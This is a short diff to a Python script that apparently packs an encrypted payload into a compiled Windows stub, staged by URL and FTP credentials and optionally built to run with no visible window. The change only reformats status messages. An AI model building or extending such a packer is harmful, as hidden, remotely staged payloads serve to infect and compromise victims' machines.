@@ -125,8 +125,8 @@ def main():
             f.write(encrypted)
             print(f"[+] Writing encrypted payload to external file: {bin_output}")
             print(f"[+] Staging details:")
-            print(f"    URL: {args.url}")
-            print(f"    FTP user: {args.ftp_user}")
+            print(f"[+] URL: {args.url}")
+            print(f"[+] FTP user: {args.ftp_user}")
         generate_stub(encrypted, args.key, args.encrypt, args.type, url=args.url, embed_payload=False, ftp_user=args.ftp_user, ftp_pass=args.ftp_pass)
     else:
         print("[+] Embedding payload directly into stub")
@@ -134,7 +134,7 @@ def main():
 
     print(f"[+] Preparing to compile stub: {args.output}")
     compile_mode = "Hidden (-mwindows)" if args.hide else "Console (-mconsole)"
-    print(f"    Compile mode: {compile_mode}")
+    print(f"[+] Compile mode: {compile_mode}")
     compile_stub(args.output, hide=args.hide)
     print(f"[✓] Packing complete: {args.output}")
 
